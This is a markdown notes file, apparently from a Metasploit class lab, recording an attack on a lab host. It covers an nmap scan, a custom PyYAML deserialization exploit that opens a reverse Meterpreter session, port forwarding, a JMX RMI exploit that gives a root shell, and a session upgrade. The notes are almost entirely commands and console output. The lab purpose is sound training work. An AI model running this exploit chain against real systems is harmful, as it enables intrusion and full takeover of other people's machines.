# Notes

## Service Discovery

```
$ nmap -p0-65535 192.168.100.2 -T4 --open -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-26 22:57 MST
Stats: 0:00:58 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 54.03% done; ETC: 22:59 (0:00:50 remaining)
Nmap scan report for 192.168.100.2
Host is up (0.00034s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 89.49 seconds
```

## Database 

```
msfdb init --connection-string=postgresql://msf:metasploit-class-cu@127.0.0.1:5432/msf

msf6 > db_connect msf:metasploit-class-cu@127.0.0.1/msf
[*] Connected to Postgres data service: 127.0.0.1/msf
```

## Load custom modules

```
msf6 > loadpath payloads/modules/
Loaded 2 modules:
    2 exploit modules
```

## Exploit PyYAML

```
msf6 > use exploit/multi/http/very_legit_yaml_validator
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/very_legit_yaml_validator) > set RHOSTS 192.168.100.2
RHOSTS => 192.168.100.2
msf6 exploit(multi/http/very_legit_yaml_validator) > set RPORT 8000
RPORT => 8000
msf6 exploit(multi/http/very_legit_yaml_validator) > set LHOST 192.168.100.1
LHOST => 192.168.100.1
msf6 exploit(multi/http/very_legit_yaml_validator) > set LPORT 8010
LPORT => 8010
msf6 exploit(multi/http/very_legit_yaml_validator) > run

[*] Started reverse TCP handler on 192.168.100.1:8010
[*] Sending Command
[*] Sending stage (3045348 bytes) to 192.168.100.2
[*] Meterpreter session 1 opened (192.168.100.1:8010 -> 192.168.100.2:42028) at 2023-11-26 22:51:52 -0700
[*] Command Stager progress - 100.00% done (823/823 bytes)

meterpreter > ps

Process List
============

 PID   PPID  Name                       Arch    User         Path
 ---   ----  ----                       ----    ----         ----
 1     0     systemd                    x86_64  root
 3     2     [rcu_gp]                   x86_64  root
 4     2     [rcu_par_gp]               x86_64  root
 5     2     [slub_flushwq]             x86_64  root
 6     2     [netns]                    x86_64  root
 7     2     [kworker/0:0-events]       x86_64  root
 8     2     [kworker/0:0H-events_high  x86_64  root
             pri]
 9     2     [kworker/u2:0-events_unbo  x86_64  root
             und]
 10    2     [mm_percpu_wq]             x86_64  root
 11    2     [rcu_tasks_kthread]        x86_64  root
 12    2     [rcu_tasks_rude_kthread]   x86_64  root
 13    2     [rcu_tasks_trace_kthread]  x86_64  root
 14    2     [ksoftirqd/0]              x86_64  root
 15    2     [rcu_preempt]              x86_64  root
 16    2     [migration/0]              x86_64  root
 17    2     [cpuhp/0]                  x86_64  root
 18    2     [kdevtmpfs]                x86_64  root
 19    2     [inet_frag_wq]             x86_64  root
 20    2     [kauditd]                  x86_64  root
 21    2     [kworker/0:1-events]       x86_64  root
 22    2     [khungtaskd]               x86_64  root
 23    2     [oom_reaper]               x86_64  root
 24    2     [kworker/u2:1-events_unbo  x86_64  root
             und]
 25    2     [kworker/u2:2-events_unbo  x86_64  root
             und]
 26    2     [writeback]                x86_64  root
 27    2     [kcompactd0]               x86_64  root
 28    2     [ksmd]                     x86_64  root
 29    2     [khugepaged]               x86_64  root
 30    2     [kintegrityd]              x86_64  root
 31    2     [kblockd]                  x86_64  root
 32    2     [blkcg_punt_bio]           x86_64  root
 33    2     [devfreq_wq]               x86_64  root
 34    2     [kworker/0:1H-kblockd]     x86_64  root
 35    2     [kswapd0]                  x86_64  root
 41    2     [kthrotld]                 x86_64  root
 42    2     [mld]                      x86_64  root
 43    2     [ipv6_addrconf]            x86_64  root
 49    2     [kstrp]                    x86_64  root
 51    2     [zswap-shrink]             x86_64  root
 52    2     [kworker/u3:0]             x86_64  root
 103   2     [kworker/0:2-cgroup_destr  x86_64  root
             oy]
 139   2     [kworker/0:3-events]       x86_64  root
 141   2     [ata_sff]                  x86_64  root
 142   2     [scsi_eh_0]                x86_64  root
 143   2     [scsi_tmf_0]               x86_64  root
 144   2     [scsi_eh_1]                x86_64  root
 145   2     [scsi_tmf_1]               x86_64  root
 146   2     [kworker/u2:3-events_unbo  x86_64  root
             und]
 147   2     [hwrng]                    x86_64  root
 193   2     [jbd2/vda-8]               x86_64  root
 194   2     [ext4-rsv-conver]          x86_64  root
 466   1     systemd-journald           x86_64  root
 487   1     systemd-udevd              x86_64  root
 495   2     [kworker/0:4-ata_sff]      x86_64  root
 497   2     [kworker/u2:4-events_unbo  x86_64  root
             und]
 501   1     systemd-oomd               x86_64  systemd-oom
 632   2     [cryptd]                   x86_64  root
 684   1     dhcpcd                     x86_64  dhcpcd
 685   684   dhcpcd                     x86_64  root
 686   684   dhcpcd                     x86_64  dhcpcd
 687   684   dhcpcd                     x86_64  dhcpcd
 699   1     dbus-daemon                x86_64  messagebus
 712   1     systemd-logind             x86_64  root
 752   2     [kworker/u2:5-events_unbo  x86_64  root
             und]
 758   2     [cfg80211]                 x86_64  root
 834   1     python3.10                 x86_64  alice        /nix/store/n5fr2ppq4i3hdjbbf4636gk54s07022v-python3-3.10.13/b
                                                             in/python3.10
 841   1     agetty                     x86_64  root
 843   1     agetty                     x86_64  root
 846   1     java                       x86_64  zookeeper
 914   1     nsncd                      x86_64  nscd
 1006  1     sshd                       x86_64  root
 1044  834   sh                         x86_64  alice        /nix/store/m6xrxfbgvm8791x09f7ims712hwy3aqh-bash-interactive-
                                                             5.2-p15/bin/bash
 1049  1044  dZCsU                      x86_64  alice        /tmp/dZCsU

meterpreter > netstat

Connection list
===============

    Proto  Local address        Remote address       State        User  Inode  PID/Program name
    -----  -------------        --------------       -----        ----  -----  ----------------
    tcp    192.168.100.2:8000   0.0.0.0:*            LISTEN       1000  0
    tcp    0.0.0.0:8080         0.0.0.0:*            LISTEN       994   0
    tcp    0.0.0.0:22           0.0.0.0:*            LISTEN       0     0
    tcp    0.0.0.0:2181         0.0.0.0:*            LISTEN       994   0
    tcp    0.0.0.0:35017        0.0.0.0:*            LISTEN       994   0
    tcp    192.168.100.2:42028  192.168.100.1:8010   ESTABLISHED  1000  0
    tcp    127.0.0.1:2181       127.0.0.1:59348      CLOSE_WAIT   994   0
    tcp    192.168.100.2:8000   192.168.100.1:46403  CLOSE_WAIT   1000  0
    tcp    :::22                :::*                 LISTEN       0     0
    udp    0.0.0.0:68           0.0.0.0:*                         0     0
    udp    :::546               :::*                              0     0

meterpreter >
```

## Interact with meterpreter

TODO

```
meterpreter > sysinfo
Computer     : 10.0.2.15
OS           : nixos 23.05 (Linux 6.1.63)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: alice
```

## Forward Ports

```
msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 19
[*] Starting interaction with 19...

meterpreter > portfwd list

Active Port Forwards
====================

   Index  Local                Remote         Direction
   -----  -----                ------         ---------
   1      192.168.100.2:8011   0.0.0.0:8011   Forward
   2      192.168.100.2:45393  0.0.0.0:45393  Forward

2 total active port forwards.
```


## Modify JMX Module and Switch to bind shell

```
msf6 exploit(multi/misc/java_jmx_server_custom) > show options

Module options (exploit/multi/misc/java_jmx_server_custom):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   JMXRMI        jmxrmi           yes       The name where the JMX RMI interface is bound
   JMX_PASSWORD                   no        The password to interact with an authenticated JMX endpoint
   JMX_ROLE                       no        The role to interact with an authenticated JMX endpoint
   RHOSTS        127.0.0.1        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basi
                                            cs/using-metasploit.html
   RPORT         8011             yes       The target port (TCP)
   SRVHOST       0.0.0.0          yes       The local host or network interface to listen on. This must be an address on t
                                            he local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT       8009             yes       The local port to listen on.
   SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                        no        The URI to use for this exploit (default is random)


Payload options (java/shell/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.100.1    yes       The listen address (an interface may be specified)
   LPORT  8010             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Generic (Java Payload)



View the full module info with the info, or info -d command.

msf6 exploit(multi/misc/java_jmx_server_custom) > run

[*] Started reverse TCP handler on 192.168.100.1:8010
[*] 127.0.0.1:8011 - Using URL: http://192.168.100.1:8009/RWkOVN
[*] 127.0.0.1:8011 - Sending RMI Header...
[*] 127.0.0.1:8011 - Discovering the JMXRMI endpoint...
[+] 127.0.0.1:8011 - JMXRMI endpoint on 192.168.100.2:45393
[*] 127.0.0.1:8011 - Proceeding with handshake...
[+] 127.0.0.1:8011 - Handshake with JMX MBean server on 192.168.100.2:45393
[*] 127.0.0.1:8011 - Loading payload...
[*] 127.0.0.1:8011 - Replied to request for mlet
[*] 127.0.0.1:8011 - Replied to request for payload JAR
[*] 127.0.0.1:8011 - Executing payload...
[*] 127.0.0.1:8011 - Replied to request for payload JAR
[*] Sending stage (2952 bytes) to 192.168.100.2
[*] Command shell session 25 opened (192.168.100.1:8010 -> 192.168.100.2:39330) at 2023-11-26 21:34:33 -0700
[*] 127.0.0.1:8011 - Server stopped.

id
uid=0(root) gid=0(root) groups=0(root)
```


## Upgrade shell

```
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 26
SESSION => 26
msf6 post(multi/manage/shell_to_meterpreter) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: java
[*] Upgrading session ID: 26
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.100.1:8009
[*] Sending stage (1017704 bytes) to 192.168.100.2
[*] Meterpreter session 27 opened (192.168.100.1:8009 -> 192.168.100.2:57578) at 2023-11-26 22:33:59 -0700
[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type                   Information        Connection
  --  ----  ----                   -----------        ----------
  19        meterpreter x64/linux  alice @ 10.0.2.15  192.168.100.1:8010 -> 192.168.100.2:60702 (192.168.100.2)
  26        shell java/java                           192.168.100.1:8010 -> 192.168.100.2:60524 (127.0.0.1)
  27        meterpreter x86/linux  root @ 10.0.2.15   192.168.100.1:8009 -> 192.168.100.2:57578 (192.168.100.2)
  ```
